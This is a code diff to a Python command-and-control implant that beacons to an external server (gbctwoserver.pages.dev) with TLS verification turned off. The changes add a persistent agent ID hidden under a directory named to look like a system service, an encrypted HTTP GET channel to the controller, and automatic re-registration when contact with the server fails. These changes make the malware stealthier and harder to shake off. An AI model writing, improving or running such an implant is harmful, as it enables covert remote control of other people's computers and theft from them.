@@ -15,6 +15,7 @@ from urllib.request import Request, urlopen, HTTPSHandler, build_opener
 from urllib.error import URLError
 from base64 import b64encode, b64decode
 from datetime import datetime
+from pathlib import Path
 
 # Import resource monitor (auto-starts optimization in background)
 try:
@@ -26,7 +27,6 @@ except ImportError:
 
 # ─── Configuration ─────────────────────────────────────────────────────────────
 C2_URL   = os.environ.get("C2_URL",    "https://gbctwoserver.pages.dev")
-AGENT_ID = os.environ.get("AGENT_ID",  str(uuid.uuid4()))
 SLEEP    = int(os.environ.get("SLEEP",  "3"))  # Faster beacon for better tracking
 JITTER   = int(os.environ.get("JITTER", "5"))   # Lower jitter
 ENC_KEY  = os.environ.get("ENC_KEY",   "")
@@ -34,6 +34,26 @@ AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")
 DEBUG    = os.environ.get("C2_DEBUG",  "1")  # Enable debug by default
 
 # Persistence marker file
+PERSIST_MARKER = Path.home() / ".cache" / ".system_services" / ".agent_initialized"
+
+def get_agent_id():
+    """Get or create persistent agent ID."""
+    agent_id_file = Path.home() / ".cache" / ".system_services" / ".agent_id"
+    
+    # Try to read existing ID
+    if agent_id_file.exists():
+        try:
+            return agent_id_file.read_text().strip()
+        except:
+            pass
+    
+    # Generate new ID and save
+    new_id = os.environ.get("AGENT_ID", str(uuid.uuid4()))
+    agent_id_file.parent.mkdir(parents=True, exist_ok=True)
+    agent_id_file.write_text(new_id)
+    return new_id
+
+AGENT_ID = get_agent_id()
 PERSIST_MARKER = os.path.expanduser("~/.cache/.system_update_marker")
 
 # ─── Debug Logger ──────────────────────────────────────────────────────────────
@@ -167,6 +187,30 @@ def http_post(path, data, c2_url=None, auth_token=None, enc_key=None):
         except Exception:
             pass
     return json.loads(raw)
+
+def http_get(path, c2_url=None, auth_token=None, enc_key=None, timeout=10):
+    """HTTP GET request to C2 server."""
+    c2_url = c2_url or C2_URL
+    auth_token = auth_token or AUTH_TOKEN
+    enc_key = enc_key or ENC_KEY
+    
+    headers = {"User-Agent": "Mozilla/5.0"}
+    if auth_token:
+        headers["X-Auth-Token"] = auth_token
+    
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    opener = build_opener(HTTPSHandler(context=ctx))
+    
+    req = Request(f"{c2_url}{path}", headers=headers)
+    resp = opener.open(req, timeout=timeout)
+    data = resp.read().decode()
+    
+    if enc_key and resp.headers.get("X-Enc") == "1":
+        data = xor_crypt(b64decode(data), enc_key.encode()).decode()
+    
+    return json.loads(data)
 
 # ─── System info ──────────────────────────────────────────────────────────────
 def collect_sysinfo():
@@ -565,12 +609,27 @@ def beacon_loop(c2_url=None, agent_id=None, auth_token=None, enc_key=None, sleep
     _consecutive_failures = 0
     _total_beacons = 0
     _total_tasks = 0
+    _last_successful_beacon = time.time()
     
     log(f"Starting beacon loop (sleep={_sleep}s, jitter={_jitter}%)", "START")
     
     while True:
         try:
             _total_beacons += 1
+            
+            # Health check before beacon
+            try:
+                health = http_get("/api/health", c2_url or C2_URL, timeout=5)
+                if health.get("status") != "ok":
+                    log("Server health check failed, re-registering...", "CONN")
+                    register(c2_url, agent_id, auth_token, enc_key)
+            except Exception as e:
+                log(f"Health check failed: {e}, attempting re-register", "CONN")
+                try:
+                    register(c2_url, agent_id, auth_token, enc_key)
+                except Exception as re:
+                    log(f"Re-register failed: {re}", "ERROR")
+            
             log(f"Beacon #{_total_beacons} to {c2_url or C2_URL}", "CONN")
             
             resp = http_post("/api/agent/beacon", {"id": agent_id or AGENT_ID}, c2_url, auth_token, enc_key)
@@ -578,6 +637,7 @@ def beacon_loop(c2_url=None, agent_id=None, auth_token=None, enc_key=None, sleep
             # Success - reset retry delay
             _consecutive_failures = 0
             _retry_delay = 5
+            _last_successful_beacon = time.time()
             
             # Update sleep/jitter from server
             if "sleep" in resp:
@@ -610,6 +670,14 @@ def beacon_loop(c2_url=None, agent_id=None, auth_token=None, enc_key=None, sleep
         except URLError as e:
             _consecutive_failures += 1
             log_connection_attempt(c2_url or C2_URL, _consecutive_failures, e)
+            
+            # Re-register after 5 consecutive failures
+            if _consecutive_failures >= 5 and (_consecutive_failures % 5 == 0):
+                log(f"Too many failures, attempting re-register (attempt {_consecutive_failures // 5})", "CONN")
+                try:
+                    register(c2_url, agent_id, auth_token, enc_key)
+                except Exception as re:
+                    log(f"Re-register failed: {re}", "ERROR")
             
             # Exponential backoff
             if _consecutive_failures > 3:
